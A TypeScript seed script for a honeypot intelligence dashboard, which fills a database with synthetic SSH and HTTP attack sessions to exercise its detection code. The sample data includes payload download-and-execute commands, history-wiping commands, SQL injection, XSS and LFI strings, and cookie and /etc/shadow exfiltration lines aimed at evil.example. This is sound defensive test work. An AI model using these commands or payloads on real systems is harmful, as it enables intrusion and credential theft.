/**
 * Seed intelligence data for development / demo purposes.
 * Run: npm run seed:intelligence
 *
 * Creates representative sessions that exercise every intelligence path:
 *  - repeated uname fingerprint patterns (BOT)
 *  - root/password credential patterns
 *  - human-like navigation session (HUMAN)
 *  - payload execution chain (ADVANCED / CRITICAL)
 *  - anti-forensics chain (ADVANCED / HIGH)
 *  - IoT bot chain (BOT / MEDIUM)
 *  - HTTP SQLI brute force session (ADVANCED / CRITICAL)
 *  - HTTP XSS injection session
 *  - HTTP scanner session (SCAN chain)
 *  - HTTP mixed credential + payload session
 */

import { PrismaClient, EventType } from "@prisma/client";
import { createHash } from "crypto";
import { updateCommandPattern, updateCredentialPattern, updateHttpPattern } from "../src/lib/intelligence/patterns";
import { updateActorProfile } from "../src/lib/intelligence/actors";
import { detectAttackChains, detectHttpChains } from "../src/lib/intelligence/chains";
import { scoreSession } from "../src/lib/intelligence/scorer";

const prisma = new PrismaClient();

function sha256(s: string) {
  return createHash("sha256").update(s).digest("hex");
}

async function ensureHoneypot() {
  const existing = await prisma.honeypot.findFirst({ where: { type: "SSH" } });
  if (existing) return existing;
  return prisma.honeypot.create({
    data: {
      name: "SSH Honeypot Alpha",
      type: "SSH",
      status: "STOPPED",
      publicPort: 2222,
      dockerService: "cowrie",
      configJson: { hostname: "ubuntu-server", version: "OpenSSH_8.9p1" },
    },
  });
}

async function ensureHttpHoneypot() {
  const existing = await prisma.honeypot.findFirst({ where: { type: "HTTP" } });
  if (existing) return existing;
  return prisma.honeypot.create({
    data: {
      name: "HTTP Trap",
      type: "HTTP",
      status: "RUNNING",
      publicPort: 8080,
      configJson: { paths: ["/trap/login", "/trap/admin", "/trap/wp-admin", "/trap/api/auth", "/trap/upload"] },
    },
  });
}

interface RawEvent {
  type: EventType;
  command?: string;
  username?: string;
  passwordHash?: string;
  tsOffset: number;
}

async function createSshSession(params: {
  honeypotId: string;
  sourceIp: string;
  events: RawEvent[];
  durationSeconds: number;
}) {
  const { honeypotId, sourceIp, events, durationSeconds } = params;
  const startedAt = new Date(Date.now() - Math.random() * 86400000);
  const endedAt = new Date(startedAt.getTime() + durationSeconds * 1000);

  const commands = events.filter((e) => e.command).map((e) => e.command!);
  const loginAttempts = events.filter(
    (e) => e.type === EventType.LOGIN_FAILED || e.type === EventType.LOGIN_SUCCESS
  ).length;
  const hasLoginSuccess = events.some((e) => e.type === EventType.LOGIN_SUCCESS);

  const { riskLevel, actorType } = scoreSession({
    commands,
    loginAttempts,
    loginSuccess: hasLoginSuccess,
    sessionDurationSeconds: durationSeconds,
  });

  const session = await prisma.session.create({
    data: { honeypotId, sourceIp, startedAt, endedAt, riskLevel, actorType },
  });

  for (const ev of events) {
    await prisma.event.create({
      data: {
        sessionId: session.id,
        eventType: ev.type,
        command: ev.command ?? null,
        username: ev.username ?? null,
        password: ev.passwordHash ?? null,
        rawJson: { seed: true, ...ev },
        createdAt: new Date(startedAt.getTime() + ev.tsOffset * 1000),
      },
    });
  }

  const usernames = [...new Set(events.filter((e) => e.username).map((e) => e.username!))];
  const passwordHashMap = new Map<string, string>();
  for (const ev of events) {
    if (ev.username && ev.passwordHash) passwordHashMap.set(ev.username, ev.passwordHash);
  }

  for (const cmd of commands) {
    await updateCommandPattern({ command: cmd, sourceIp }).catch(console.error);
  }
  for (const username of usernames) {
    const hash = passwordHashMap.get(username);
    if (hash) {
      await updateCredentialPattern({ username, passwordHash: hash, sourceIp }).catch(console.error);
    }
  }
  await updateActorProfile({
    sourceIp, actorType, riskLevel, commands, usernames,
    eventCount: events.length, isNewSession: true,
  }).catch(console.error);
  await detectAttackChains({
    sessionId: session.id, honeypotId, commands, hasLoginSuccess,
  }).catch(console.error);

  return session;
}

interface HttpRawEvent {
  type: EventType;
  endpoint: string;
  method: string;
  username?: string;
  passwordHash?: string;
  payload?: string;
  payloadCategory?: string;
  tsOffset: number;
}

async function createHttpSession(params: {
  honeypotId: string;
  sourceIp: string;
  events: HttpRawEvent[];
}) {
  const { honeypotId, sourceIp, events } = params;
  const startedAt = new Date(Date.now() - Math.random() * 43200000);
  const endedAt = new Date(startedAt.getTime() + events[events.length - 1].tsOffset * 1000);

  const hourBucket = Math.floor(startedAt.getTime() / 3_600_000);
  const sessionRef = `http:seed:${honeypotId}:${sourceIp}:${hourBucket}:${Math.random().toString(36).slice(2, 8)}`;

  const hasPayload = events.some((e) => e.payloadCategory && e.payloadCategory !== "NONE");
  const hasLogin = events.some((e) => e.type === EventType.HTTP_LOGIN_ATTEMPT);

  const session = await prisma.session.create({
    data: {
      honeypotId,
      sourceIp,
      startedAt,
      endedAt,
      riskLevel: hasPayload ? "HIGH" : hasLogin ? "MEDIUM" : "LOW",
      actorType: "UNKNOWN",
      sessionRef,
    },
  });

  for (const ev of events) {
    await prisma.event.create({
      data: {
        sessionId: session.id,
        eventType: ev.type,
        command: ev.payload ? ev.payload.slice(0, 500) : ev.endpoint,
        username: ev.username ?? null,
        password: ev.passwordHash ?? null,
        rawJson: {
          seed: true,
          endpoint: ev.endpoint,
          method: ev.method,
          payloadCategory: ev.payloadCategory ?? null,
        },
        createdAt: new Date(startedAt.getTime() + ev.tsOffset * 1000),
      },
    });
  }

  const payloadEvents = events.filter((e) => e.payload && e.payloadCategory && e.payloadCategory !== "NONE");
  for (const ev of payloadEvents) {
    await updateHttpPattern({ payload: ev.payload!, payloadCategory: ev.payloadCategory!, sourceIp }).catch(console.error);
  }

  const loginEvents = events.filter((e) => e.username && e.passwordHash);
  for (const ev of loginEvents) {
    await updateCredentialPattern({ username: ev.username!, passwordHash: ev.passwordHash!, sourceIp }).catch(console.error);
  }

  await updateActorProfile({
    sourceIp,
    actorType: "UNKNOWN",
    riskLevel: hasPayload ? "HIGH" : hasLogin ? "MEDIUM" : "LOW",
    commands: [],
    usernames: [...new Set(loginEvents.map((e) => e.username!))],
    eventCount: events.length,
    isNewSession: true,
    httpRequest: true,
    httpPayload: payloadEvents.length > 0,
  }).catch(console.error);

  await detectHttpChains({ sessionId: session.id, honeypotId }).catch(console.error);

  return session;
}

async function main() {
  const honeypot = await ensureHoneypot();
  const httpHoneypot = await ensureHttpHoneypot();
  const hpId = honeypot.id;
  const httpId = httpHoneypot.id;

  console.log(`Using SSH honeypot:  ${honeypot.name} (${hpId})`);
  console.log(`Using HTTP honeypot: ${httpHoneypot.name} (${httpId})`);

  // ── 1. BOT fingerprint sessions ──────────────────────────
  console.log("Creating BOT fingerprint sessions...");
  for (let i = 1; i <= 5; i++) {
    await createSshSession({
      honeypotId: hpId,
      sourceIp: `192.0.2.${i}`,
      durationSeconds: 3,
      events: [
        { type: EventType.CONNECTION,    tsOffset: 0 },
        { type: EventType.LOGIN_FAILED,  username: "root", passwordHash: sha256("123456"),   tsOffset: 1 },
        { type: EventType.LOGIN_FAILED,  username: "root", passwordHash: sha256("password"), tsOffset: 1.5 },
        { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("admin"),    tsOffset: 2 },
        { type: EventType.COMMAND,       command: "uname -a",           tsOffset: 2.2 },
        { type: EventType.COMMAND,       command: "cat /etc/passwd",    tsOffset: 2.5 },
        { type: EventType.DISCONNECT,    tsOffset: 3 },
      ],
    });
  }

  // ── 2. Credential spray ───────────────────────────────────
  console.log("Creating credential spray sessions...");
  const credPairs = [
    { username: "root",  password: "password" },
    { username: "admin", password: "admin" },
    { username: "user",  password: "1234" },
    { username: "root",  password: "toor" },
    { username: "pi",    password: "raspberry" },
  ];
  for (let i = 0; i < credPairs.length; i++) {
    const { username, password } = credPairs[i];
    await createSshSession({
      honeypotId: hpId,
      sourceIp: `198.51.100.${10 + i}`,
      durationSeconds: 1,
      events: [
        { type: EventType.CONNECTION,   tsOffset: 0 },
        { type: EventType.LOGIN_FAILED, username, passwordHash: sha256(password), tsOffset: 0.5 },
        { type: EventType.DISCONNECT,   tsOffset: 1 },
      ],
    });
  }

  // ── 3. Human-like exploratory session ────────────────────
  console.log("Creating HUMAN session...");
  await createSshSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.10",
    durationSeconds: 120,
    events: [
      { type: EventType.CONNECTION,    tsOffset: 0 },
      { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("password123"), tsOffset: 2 },
      { type: EventType.COMMAND,       command: "whoami",           tsOffset: 5 },
      { type: EventType.COMMAND,       command: "lss",              tsOffset: 9 },
      { type: EventType.COMMAND,       command: "ls",               tsOffset: 12 },
      { type: EventType.COMMAND,       command: "cd /home",         tsOffset: 18 },
      { type: EventType.COMMAND,       command: "ls",               tsOffset: 20 },
      { type: EventType.COMMAND,       command: "cat /etc/passwd",  tsOffset: 35 },
      { type: EventType.COMMAND,       command: "cd /tmp",          tsOffset: 50 },
      { type: EventType.COMMAND,       command: "ls -la",           tsOffset: 55 },
      { type: EventType.COMMAND,       command: "id",               tsOffset: 70 },
      { type: EventType.DISCONNECT,    tsOffset: 120 },
    ],
  });

  // ── 4. Payload execution chain ────────────────────────────
  console.log("Creating PAYLOAD EXECUTION chain session...");
  await createSshSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.20",
    durationSeconds: 45,
    events: [
      { type: EventType.CONNECTION,    tsOffset: 0 },
      { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("root"), tsOffset: 1 },
      { type: EventType.COMMAND,       command: "uname -a",                                      tsOffset: 2 },
      { type: EventType.COMMAND,       command: "whoami",                                        tsOffset: 4 },
      { type: EventType.COMMAND,       command: "wget http://203.0.113.99/payload.sh -O /tmp/p", tsOffset: 8 },
      { type: EventType.COMMAND,       command: "chmod +x /tmp/p",                               tsOffset: 12 },
      { type: EventType.COMMAND,       command: "./p",                                           tsOffset: 15 },
      { type: EventType.DISCONNECT,    tsOffset: 45 },
    ],
  });

  // ── 5. Anti-forensics chain ────────────────────────────────
  console.log("Creating ANTI-FORENSICS chain session...");
  await createSshSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.30",
    durationSeconds: 60,
    events: [
      { type: EventType.CONNECTION,    tsOffset: 0 },
      { type: EventType.LOGIN_SUCCESS, username: "root", passwordHash: sha256("changeme"), tsOffset: 1 },
      { type: EventType.COMMAND,       command: "whoami",                    tsOffset: 2 },
      { type: EventType.COMMAND,       command: "id",                        tsOffset: 4 },
      { type: EventType.COMMAND,       command: "export HISTFILE=/dev/null", tsOffset: 8 },
      { type: EventType.COMMAND,       command: "unset HISTSIZE",            tsOffset: 10 },
      { type: EventType.COMMAND,       command: "rm -f ~/.bash_history",     tsOffset: 14 },
      { type: EventType.COMMAND,       command: "history -c",                tsOffset: 16 },
      { type: EventType.DISCONNECT,    tsOffset: 60 },
    ],
  });

  // ── 6. IoT bot chain ──────────────────────────────────────
  console.log("Creating IOT_BOT chain session...");
  await createSshSession({
    honeypotId: hpId,
    sourceIp: "203.0.113.40",
    durationSeconds: 8,
    events: [
      { type: EventType.CONNECTION,    tsOffset: 0 },
      { type: EventType.LOGIN_FAILED,  username: "admin", passwordHash: sha256("admin"),  tsOffset: 0.5 },
      { type: EventType.LOGIN_SUCCESS, username: "admin", passwordHash: sha256("1234"),   tsOffset: 1 },
      { type: EventType.COMMAND,       command: "enable",                                  tsOffset: 1.5 },
      { type: EventType.COMMAND,       command: "system",                                  tsOffset: 2 },
      { type: EventType.COMMAND,       command: "shell",                                   tsOffset: 2.5 },
      { type: EventType.COMMAND,       command: "wget http://203.0.113.99/bot.sh",         tsOffset: 3 },
      { type: EventType.DISCONNECT,    tsOffset: 8 },
    ],
  });

  // ── 7. HTTP SQLI brute force ──────────────────────────────
  console.log("Creating HTTP SQLI brute force session...");
  const sqliPayloads = [
    "' OR '1'='1",
    "admin'--",
    "' UNION SELECT username,password FROM users--",
    "1' AND SLEEP(5)--",
    "' OR 1=1--",
    "admin' OR '1'='1' --",
  ];
  await createHttpSession({
    honeypotId: httpId,
    sourceIp: "185.220.101.10",
    events: [
      { type: EventType.HTTP_REQUEST,       endpoint: "/trap/login",  method: "GET",  tsOffset: 0 },
      ...sqliPayloads.map((payload, i) => ({
        type: EventType.HTTP_PAYLOAD_ATTEMPT as EventType,
        endpoint: "/trap/login",
        method: "POST",
        username: payload,
        passwordHash: sha256("password"),
        payload,
        payloadCategory: "SQLI",
        tsOffset: 2 + i * 3,
      })),
    ],
  });

  // ── 8. HTTP XSS injection session ────────────────────────
  console.log("Creating HTTP XSS injection session...");
  const xssPayloads = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:eval('alert(1)')",
    "<svg onload=fetch('https://evil.example/'+document.cookie)>",
  ];
  await createHttpSession({
    honeypotId: httpId,
    sourceIp: "185.220.101.20",
    events: [
      { type: EventType.HTTP_REQUEST, endpoint: "/trap/admin", method: "GET", tsOffset: 0 },
      ...xssPayloads.map((payload, i) => ({
        type: EventType.HTTP_PAYLOAD_ATTEMPT as EventType,
        endpoint: "/trap/admin",
        method: "POST",
        username: payload,
        passwordHash: sha256("test"),
        payload,
        payloadCategory: "XSS",
        tsOffset: 5 + i * 4,
      })),
    ],
  });

  // ── 9. HTTP scanner session ───────────────────────────────
  console.log("Creating HTTP SCAN session...");
  const scanPaths = [
    "/trap/login", "/trap/admin", "/trap/wp-admin", "/trap/upload",
    "/trap/api/auth", "/admin", "/wp-login.php", "/phpmyadmin",
    "/.env", "/config.php", "/backup.zip", "/robots.txt",
  ];
  await createHttpSession({
    honeypotId: httpId,
    sourceIp: "198.51.100.99",
    events: scanPaths.map((ep, i) => ({
      type: EventType.HTTP_REQUEST as EventType,
      endpoint: ep,
      method: "GET",
      tsOffset: i * 0.8,
    })),
  });

  // ── 10. HTTP mixed credential + LFI session ────────────────
  console.log("Creating HTTP mixed attack session...");
  await createHttpSession({
    honeypotId: httpId,
    sourceIp: "103.21.244.10",
    events: [
      { type: EventType.HTTP_REQUEST,       endpoint: "/trap/login",  method: "GET",  tsOffset: 0 },
      { type: EventType.HTTP_LOGIN_ATTEMPT, endpoint: "/trap/login",  method: "POST", username: "admin",    passwordHash: sha256("admin"),    tsOffset: 2 },
      { type: EventType.HTTP_LOGIN_ATTEMPT, endpoint: "/trap/login",  method: "POST", username: "root",     passwordHash: sha256("password"),  tsOffset: 4 },
      { type: EventType.HTTP_LOGIN_ATTEMPT, endpoint: "/trap/login",  method: "POST", username: "test",     passwordHash: sha256("test123"),   tsOffset: 6 },
      { type: EventType.HTTP_REQUEST,       endpoint: "/trap/upload", method: "GET",  tsOffset: 10 },
      {
        type: EventType.HTTP_PAYLOAD_ATTEMPT,
        endpoint: "/trap/upload",
        method: "POST",
        payload: "../../../../etc/passwd",
        payloadCategory: "LFI",
        tsOffset: 14,
      },
      {
        type: EventType.HTTP_PAYLOAD_ATTEMPT,
        endpoint: "/trap/upload",
        method: "POST",
        payload: "; cat /etc/shadow | wget http://evil.example/collect -d @-",
        payloadCategory: "CMD_INJECTION",
        tsOffset: 18,
      },
    ],
  });

  // ── Summary ────────────────────────────────────────────────
  const [cmdCount, credCount, actorCount, chainCount] = await Promise.all([
    prisma.commandPattern.count(),
    prisma.credentialPattern.count(),
    prisma.actorProfile.count(),
    prisma.attackChain.count(),
  ]);

  const [httpPatternCount, httpChainCount] = await Promise.all([
    prisma.commandPattern.count({ where: { patternType: "HTTP_PAYLOAD" } }),
    prisma.attackChain.count({ where: { chainType: { in: ["AUTH_BRUTE_FORCE", "WEB_EXPLOIT", "SCAN"] } } }),
  ]);

  console.log("\nSeed complete:");
  console.log(`  Command patterns (SSH):  ${cmdCount - httpPatternCount}`);
  console.log(`  HTTP payload patterns:   ${httpPatternCount}`);
  console.log(`  Credential patterns:     ${credCount}`);
  console.log(`  Actor profiles:          ${actorCount}`);
  console.log(`  SSH attack chains:       ${chainCount - httpChainCount}`);
  console.log(`  HTTP attack chains:      ${httpChainCount}`);
}

main()
  .catch(console.error)
  .finally(() => prisma.$disconnect());
